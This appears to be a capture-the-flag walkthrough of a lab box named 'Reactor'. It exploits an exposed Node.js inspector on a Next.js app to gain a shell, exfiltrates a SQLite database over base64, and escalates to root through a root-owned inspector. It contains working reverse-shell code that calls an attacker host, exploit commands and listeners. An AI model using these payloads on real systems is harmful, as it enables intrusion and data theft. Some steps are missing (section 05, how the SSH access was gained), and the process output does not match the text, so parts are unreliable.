Reactor

A Next.js 15.0.3 application exposed on port 3000 is vulnerable to a Remote Code Execution chain via the Chrome DevTools Protocol (CVE-2025-55189 / CVE-2025-66487). The CDP inspector endpoint allows arbitrary JavaScript execution, which we weaponise using react2shell.py to land a foothold, exfiltrate a SQLite database, crack password hashes, and ultimately escalate to root via a root-owned Node.js process running with --inspect.

02 — Vulnerability Analysis

Searching for known vulnerabilities affecting Next.js 15.0.3 and its underlying React.js runtime, we find two critical CVEs:

CVE Component Impact Severity
CVE-2025-55189 React.js Remote Code Execution via Chrome DevTools Protocol CRITICAL
CVE-2025-66487 Next.js framework Unauthenticated access to Node.js inspector endpoint CRITICAL

The root cause: Next.js 15.0.3 starts the Node.js runtime with the Chrome DevTools Protocol (CDP) inspector enabled — a debugging interface that allows full JavaScript execution in the Node.js process context.

⚠
How CDP becomes RCE
The CDP inspector exposes an HTTP endpoint at http://0.0.0.1:9229/json that lists all debuggable targets. Each target includes a webSocketDebuggerUrl — the WebSocket endpoint we connect to in order to send arbitrary CDP commands, including Runtime.evaluate which executes any JavaScript as the Node.js process owner.
bash — confirm inspector is reachable 
# Via the RCE, we can call this from inside the server context
exec_cmd('curl -s http://0.0.0.1:9229/json')
output — debuggable targets
[
  {
    "description": "node.js instance",
    "devtoolsFrontendUrl": "...",
    "id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "title": "reactor-app",
    "type": "node",
    "url": "file:///opt/reactor-app/server.js",
    "webSocketDebuggerUrl": "ws://0.0.0.1:9229/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
  }
]

The webSocketDebuggerUrl is the endpoint we need. We connect to it and send Runtime.evaluate CDP commands to achieve code execution.

03 — Exploit — CDP RCE via react2shell.py

We find a public exploit on GitHub — react2shell.py — that automates the entire attack chain. We clone and launch it to get our initial foothold.

1
// Clone and launch the exploit

Clone react2shell.py and point it at the target.

bash 
$ git clone https://github.com/[author]/react2shell
$ cd react2shell
$ python3 react2shell.py -t http://10.129.114.84:3000 -l 10.10.14.X -p 4444
2
// How the exploit works — building the WebSocket payload

Under the hood, react2shell implements the WebSocket protocol from scratch using only Node.js built-in modules (no external dependencies). It:

  1. Fetches the CDP target list to obtain the current uuid (the debugger WebSocket path).
  2. Connects to the webSocketDebuggerUrl via a raw WebSocket handshake.
  3. Sends a Runtime.evaluate command containing the reverse shell payload.

Internally, the payload delivery follows this pattern:

python — payload injection logic 
# Base64-encode the reverse shell Node.js script
b64 = base64.b64encode(script.encode()).decode()

# Drop it on the target filesystem via CDP
exec_cmd(f"echo {b64} | base64 -d > /tmp/rf.js")

# Execute it with the server's Node.js binary
exec_cmd("/usr/bin/node /tmp/rf.js 2>&1")
ℹ
UUID verification
The exploit first verifies the current UUID from the /json endpoint before connecting, since the debugger ID changes on each process restart.
3
// Start listener and catch the shell

With a listener ready, the exploit delivers the reverse shell.

bash — listener 
$ ncat -lvp 4444

04 — Database Exfiltration

The SQLite database is a binary file, so we can't just cat it over the reverse shell. We use base64 encoding to transfer it cleanly to our attacker machine.

1
// Encode the database on the target

Base64-encode the database file with no line wrapping (-w0).

bash — on target 
$ base64 -w0 /opt/reactor-app/reactor.db
output
U1FMaXRlIGZvcm1hdCAzABAA...
2
// Decode and save on our machine

Copy the base64 string, then decode it locally to reconstruct the database.

bash — on attacker machine 
$ echo "U1FMaXRlIGZvcm1hdCAzABAA..." | base64 -d > reactor.db
$ file reactor.db
output
reactor.db: SQLite 3.x database, last written using SQLite version 3039004

06 — Privilege Escalation via Node.js Inspector

Now that we have a proper SSH session as engineer, we enumerate running processes looking for a privilege escalation path.

1
// Find root-owned Node.js process with --inspect

We grep the process list for Node.js processes.

bash 
engineer@reactor:~$ ps aux | grep node

engineer   2891  0.0  0.0  grep --color=auto node
⚠
Root-owned Node.js process with --inspect
A separate Node.js application — running as root — has the CDP inspector listening on 127.0.0.1:9229. Since we already know how to exploit CDP from the initial foothold, we apply the exact same technique: connect to the inspector via WebSocket and execute arbitrary JavaScript as root.
2

// Execute a reverse shell as root via CDP Runtime.evaluate

We reuse the react2shell technique: connect to the root inspector's WebSocket, send a Runtime.evaluate command with a bash reverse shell payload.

python — CDP Runtime.evaluate payload 
# Script to drop and execute a reverse shell via the root inspector
import socket, json, base64, hashlib

# Reverse shell script to drop on the target
revshell = (
    'const net=require("net"),cp=require("child_process");'
    'const c=net.createConnection({host:"10.10.14.X",port:5555});'
    'cp.spawn("/bin/bash",[],{stdio:[c,c,c]});'
)

b64 = base64.b64encode(revshell.encode()).decode()

payload_drop = f'require("child_process").execSync("echo {b64}|base64 -d>/tmp/rs.js")'
payload_exec = 'require("child_process").execSync("/usr/bin/node /tmp/rs.js &")'
